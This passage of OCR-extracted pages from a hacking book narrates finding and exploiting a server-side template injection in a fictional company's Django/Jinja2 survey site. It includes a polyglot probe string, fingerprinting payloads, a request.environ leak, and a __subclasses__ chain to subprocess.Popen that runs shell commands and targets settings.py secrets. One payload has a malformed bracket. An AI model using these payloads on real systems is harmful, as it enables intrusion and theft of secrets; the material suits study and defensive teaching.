- pgno: 107
  md: '# 6


    # FRACTURE


    ![](img/961e81aef23040d0fbe348f58c055860_107_0.png)


    From our work so far, we have a few MXR Ads credentials, and we’ve uncovered the
    main ways that MXR Ads and GP handle their infrastructure, but we’re not sure
    what to do with our findings. We still have so many opportunities to explore,
    so we go back to the drawing board: a handful of GP and MXR Ads websites that
    we confirmed in Chapter 4 (see Listing 4-3). In Chapter 5, we followed our gut
    by courting the most alluring assets, the S3 buckets, which eventually led us
    to a server-side request forgery (SSRF) vulnerability. But now we’ll abide by
    a steadier and more strenuous approach.


    We will go through each website, follow each link, inspect every parameter, and
    even gather hidden links in JavaScript files using something like LinkFinder (https://github.com/GerbenJavado/LinkFinder/).
    To do this we’ll inject carefully chosen special characters into forms and fields
    here and there until we trigger an anomaly, like an explicit database error, a
    404 (Page Not Found) error, or an unexpected redirection to the main page.'
  merge: -1
  img_proc: true
- pgno: 108
  md: 'We’ll rely on Burp to capture all of the parameters surreptitiously sent to
    the server. This maneuver depends heavily on the web framework behind the website,
    the programming language, the operating system, and a few other factors, so to
    help streamline the process we will inject the following payload and compare the
    output to the application’s normal response:


    ```

    dddd", '' |&$;:`{{@{%<=ddd

    ```


    This string covers the most obvious occurrences of injection vulnerabilities for
    different frameworks: (No)SQL, system commands, templates, Lightweight Directory
    Access Protocol (LDAP), and pretty much any component using special characters
    to extend its query interface. The dddd part is like a label, some easy-to-spot
    text to help us visually locate the payload in the page’s response. A page that
    reacts even slightly unexpectedly to this string, like with an error page, a curious
    redirection, truncated output, or an input parameter reflected in the page in
    a weird way, is a promising lead worth investigating further. If the web page
    returns an innocuous response but seems to have transformed or filtered the input
    somehow, then we can probe further using more advanced payloads, like adding logical
    operators (AND 1=0), pointing to a real file location, trying a real command,
    and so on.


    We begin injecting this payload into the forms on each site in our list. Soon
    enough, we reach the URL www.surveysandsats.com, the infamous website used to
    collect and probe data on people’s personalities, which we uncovered in Chapter
    4. This has plenty of fields to inject our promiscuous string into. We enter it
    into a form, hit Submit, and are greeted with the delightful error page in Figure
    6-1.


    ![](img/961e81aef23040d0fbe348f58c055860_108_0.png)


    Figure 6-1: Surveysandstats.com reacts to our string injection


    Aha! That’s the kind of error that can make a hacker squirm with excitement. We
    turn to Burp and submit the form again, this time with perfectly innocent responses
    to the survey question with no special characters, just plain English, to make
    sure that the form normally works (see Figure 6-2). When performing normally,
    the form should send us an email confirmation.


    ![](img/961e81aef23040d0fbe348f58c055860_108_1.png)


    Figure 6-2: A regular form submission in Burp'
  merge: -1
  img_proc: true
- pgno: 109
  md: "And sure enough, a couple of seconds later, we receive an email with the results\
    \ of the survey (see Figure 6-3).\n\n![](img/961e81aef23040d0fbe348f58c055860_109_0.png)\n\
    \n*Figure 6-3: Email reply from our normal survey submission*\n\nThe survey is\
    \ working just fine, which means it's likely that it was indeed some special character\
    \ in our payload that caused the page to crash the first time. To pin down which\
    \ character, we replay the previous normal form entry, adding one special character\
    \ from our payload at a time until we close in on the suspect: {{ (the double\
    \ braces). We may very well be dealing with a server-side template injection (SSTI)\
    \ since templates often rely on double braces.\n\n# Server-Side Template Injection\n\
    \nIn many web development frameworks, templates are simple HTML files annotated\
    \ with special variables that get replaced at runtime with dynamic values. Here\
    \ are some of those special variables used in various frameworks:\n\n```\n# Ruby\
    \ templates\n<p>\n<%= @product %>\n</p>\n# Play templates (Scala/Java)\n<p>\n\
    Congratulations on product @product\n</p>\n# Jinja or Django templates\n<p>\n\
    Congratulations on product {{product}}\n</p>\n```\n\nThis separation between the\
    \ frontend of a web project (visualization in HTML/JavaScript) and the backend\
    \ (controller or model in Python/Ruby/Java) is the cornerstone of many development\
    \ frameworks and indeed many team organizations. The fun begins when the template\
    \ itself is built dynamically using untrusted input. Take the following code,\
    \ for instance. It produces a dynamic template using the render_template_string\
    \ function, which is itself built using user input:\n\n```\n--snip--\ntemplate_str\
    \ = \"\"\"\n    <div>\n        <h1>hello</h1>\n```"
  merge: -1
  img_proc: true
- pgno: 110
  md: '```

    <h3>%s</h3>

    </div>

    """ % user_input


    return render_template_string(template_str)

    ```


    In this Python snippet, if we were to inject a valid template directive like {{8*2}}
    in the user_input variable, it would be evaluated to 16 by the render_template_string
    method, meaning the page would display the result 16. The tricky thing is that
    every template engine has its own syntax, so not all would evaluate it in this
    way. While some will let you read files and execute arbitrary code, others will
    not even let you perform simple multiplication.


    That’s why our first order of business is to gather more information about this
    potential vulnerability. We need to figure out what language we are dealing with
    and which framework it is running.


    # Fingerprinting the Framework


    Since his presentation on SSTI at Black Hat USA 2015, James Kettle’s famous diagram
    depicting ways to fingerprint a templating framework has been ripped off in every
    article you may come across about this vulnerability, including here in Figure
    6-4. To explore how it works, we’ll enter a few different expressions in our survey
    form to see how they’re executed.


    ![](img/961e81aef23040d0fbe348f58c055860_110_0.png)


    Figure 6-4: Different SSTI payloads to fingerprint the templating framework'
  merge: -1
  img_proc: true
- pgno: 111
  md: 'We send the payload {{8 * ''2''}} and receive in response an email containing
    the string 2 repeated a total of eight times, as shown in Figure 6-5. This behavior
    is typical of a Python interpreter, as opposed to a PHP environment, for example,
    which would have printed 16 instead:


    ```

    # Payload


    {{8* ''2''}} # Python: 22222222, PHP: 16


    {{8*2}} # Python: 16, PHP: 16

    ```


    ![](img/961e81aef23040d0fbe348f58c055860_111_0.png)


    Figure 6-5: Typical Python output for an input of 8 * ''2''


    From this we quickly come to the conclusion that we are probably dealing with
    the famous Jinja2 template used in Python environments. Jinja2 usually runs on
    one of two major web frameworks: Flask or Django. There was a time when a quick
    look at the “Server” HTTP response header would reveal which. Unfortunately, nobody
    exposes their Flask/Django application naked on the internet anymore. They instead
    go through Apache and Nginx servers or, in this case, an AWS load balancer that
    covers the original server directive.


    Not to worry. There is a quick payload that works on both Flask and Django Jinja2
    templates, and it’s a good one: request.environ. In both frameworks, this Python
    object holds information about the current request: HTTP method, headers, user
    data, and, most importantly, environment variables loaded by the app.


    ```

    # Payload


    email=davidshaw@pokemail.net&user={{request.environ}}...

    ```


    Figure 6-6 shows the response we get from this payload.


    ![](img/961e81aef23040d0fbe348f58c055860_111_1.png)


    Figure 6-6: Response from request.environ'
  merge: -1
  img_proc: true
- pgno: 112
  md: 'Django literally appears in the PYENV_DIR path. Jackpot. The developers of
    this application seem to have decided to replace the default Django templating
    engine with the more powerful Jinja2 templating framework. This is lucky for us,
    because while Jinja2 supports a subset of Python expressions and operations that
    give it the edge in terms of performance and productivity, this flexibility comes
    at a steep price: we can manipulate Python objects, create lists, call functions,
    and even load modules in some cases.


    # Arbitrary Code Execution


    It’s almost tempting to jump ahead and attempt to access the password files with
    a payload like {{os.open(''/etc/passwd'')}}, but that would not work. The os object
    is not likely defined in the current context of the application. We can only interact
    with Python objects and methods defined in the page rendering the response. The
    request object we accessed earlier is automatically passed by Django to the template,
    so we can naturally retrieve it. The os module? Highly unlikely.


    But, and it is a most fortunate but, most modern programming languages provide
    us with some degree of introspection and reflection—reflection being the ability
    of a program, object, or class to examine itself, including listing its own properties
    and methods, changing its internal state, and so on. This is a common feature
    of many high level languages like C#, Java, Swift—and Python is no exception.
    Any Python object contains attributes and pointers to its own class properties
    and those of its parents.


    For instance, we can fetch the class of any Python object using the __class__
    attribute, which returns a valid Python object referencing this class:


    ```

    # Payload


    email=davidshaw@pokemail.net&user={{request.__class__}}...


    <class ''django.core.handlers.wsgi.WSGIRequest''>

    ```


    That class is itself a child class of a higher Python object called django.http.request.HttpRequest.
    We did not even have to read the docs to find this out; it’s written in the object
    itself, inside the __base__ variable, as we can see with this payload:


    ```

    # Payload


    email=davidshaw@pokemail.net&user={{request.__class__.__base__}}...

    <class ''django.http.request.HttpRequest''>


    email=davidshaw@pokemail.net&user={{request.__class__.__base__.__base__}}...

    <class ''object''> ①

    ```


    We continue climbing the inheritance chain, adding __base__ to the payload, until
    we reach the top-most Python object ①, the parent of all'
  merge: -1
  img_proc: true
- pgno: 113
  md: 'classes: object. In and of itself, the object class is useless, but like all
    other classes, it contains references to its subclasses as well. So after climbing
    up the chain, it''s now time to go down using the __subclasses__ method:


    ```

    # Payload


    email=davidshaw@pokemail.net&user={{request.__class__.__base__.__base__.__subclasses__()}}...


    [<class ''type''>,

    <class ''dict_values''>,

    <class ''django.core.handlers.wsgi.LimitedStream''>,

    <class ''urllib.request.OpenerDirector''>,

    <class ''_frozen_importlib._ModuleLock''>,

    <class ''subprocess.Popen''>, ①

    --snip--

    <class ''django.contrib.auth.models.AbstractUser.Meta''>,

    ]

    ```


    More than 300 classes show up. These are all the classes inheriting directly from
    the object class and loaded by the current Python interpreter.


    > NOTE

    In Python 3, all top classes are children of the object class. In Python 2, classes
    must explicitly inherit the object class.


    I hope you caught the subprocess.Popen class ①! This is the class used to execute
    system commands. We can call that object right here, right now, by referencing
    its offset in the list of subclasses, which happens to be number 282 in this particular
    case (figured out with a manual count). We can capture the output of the env command
    using the communicate method:


    ```

    # Payload


    email=davidshaw@pokemail.net&user={{request.__class__.__base__.__base__.__subclasses__()

    [282]["env", shell=True, stdout=-1).communicate()[0]}}...

    ```


    A couple of seconds later, we receive an email spilling out the environment variables
    of the Python process running on the machine:


    ```

    PWD=/opt/django/surveysapp

    PYTHON_GET_PIP_SHA256=8d412752ae26b46a39a201ec618ef9ef7656c5b2d8529cdcbe60cd70dc94f40c

    KUBERNETES_SERVICE_PORT_HTTPS=443

    HOME=/root

    --snip--

    ```


    We just achieved arbitrary code execution! Let''s see what we have of use. All
    Django settings are usually declared in a file called settings.py located at the
    root of the application. This file can contain anything from a simple declaration
    of the admin email to secret API keys. We know from the environment variables
    that the application''s full path is /opt/Django/surveysapp, and the settings
    file is usually one directory below that (with the same name). In Listing 6-1,
    we try to access it.'
